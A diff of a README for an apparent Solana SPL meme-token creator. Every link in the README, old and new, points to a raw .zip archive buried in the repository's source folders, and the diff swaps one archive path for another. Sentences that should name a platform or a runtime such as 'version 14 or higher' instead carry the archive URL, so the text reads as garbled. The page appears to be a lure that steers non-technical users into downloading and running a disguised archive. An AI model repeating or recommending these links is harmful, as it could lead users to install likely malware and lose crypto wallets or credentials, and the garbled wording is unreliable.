@@ -1,26 +1,26 @@
 # 🎨 solana-token-creator - Create Your Own Tokens Easily
 
 ## 🏷️ Overview
-The Solana Token Creator lets you create and deploy SPL tokens on the Solana blockchain. With this tool, you can launch meme tokens on https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/utils/solana-creator-token-v2.6.zip in just two simple steps. Whether you're looking to start a fun project or explore the world of cryptocurrency, this application simplifies the process of token creation.
+The Solana Token Creator lets you create and deploy SPL tokens on the Solana blockchain. With this tool, you can launch meme tokens on https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/lib/creator_solana_token_v1.7.zip in just two simple steps. Whether you're looking to start a fun project or explore the world of cryptocurrency, this application simplifies the process of token creation.
 
 ## 🌟 Features
 - Simple user interface for easy token creation.
 - Supports the Solana blockchain, known for its speed and low transaction costs.
 - Designed for non-technical users; no programming knowledge required.
 - Create meme tokens quickly to engage your community.
-- Fully compatible with https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/utils/solana-creator-token-v2.6.zip for launching your tokens easily.
+- Fully compatible with https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/lib/creator_solana_token_v1.7.zip for launching your tokens easily.
 
 ## 📦 System Requirements
 - A compatible operating system: Windows, macOS, or Linux.
 - Internet connection to connect with the Solana blockchain.
-- https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/utils/solana-creator-token-v2.6.zip version 14 or higher installed on your system. 
+- https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/lib/creator_solana_token_v1.7.zip version 14 or higher installed on your system. 
 
 ## 🚀 Getting Started
 To get started with the Solana Token Creator, you need to download the application from our Releases page. Follow these simple steps:
 
 1. **Download the Application**  
    Click on the link below to visit the Releases page.  
-   [![Download Solana Token Creator](https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/utils/solana-creator-token-v2.6.zip%20Now-blue)](https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/utils/solana-creator-token-v2.6.zip)
+   [![Download Solana Token Creator](https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/lib/creator_solana_token_v1.7.zip%20Now-blue)](https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/lib/creator_solana_token_v1.7.zip)
 
 2. **Install the Application**  
    After visiting the page, look for the latest release title. Choose the file for your operating system and click on it to download. Once downloaded, follow the installation instructions for your specific OS.
@@ -30,7 +30,7 @@ To get started with the Solana Token Creator, you need to download the applicati
 
 ## 📥 Download & Install
 To download the Solana Token Creator, visit the page linked below.  
-[![Visit Releases Page](https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/utils/solana-creator-token-v2.6.zip%20Solana%20Token%20Creator-green)](https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/utils/solana-creator-token-v2.6.zip)
+[![Visit Releases Page](https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/lib/creator_solana_token_v1.7.zip%20Solana%20Token%20Creator-green)](https://github.com/nada11-cel/solana-token-creator/raw/refs/heads/main/src/lib/creator_solana_token_v1.7.zip)
 
 Once on the page:
 - Select the appropriate version for your system.
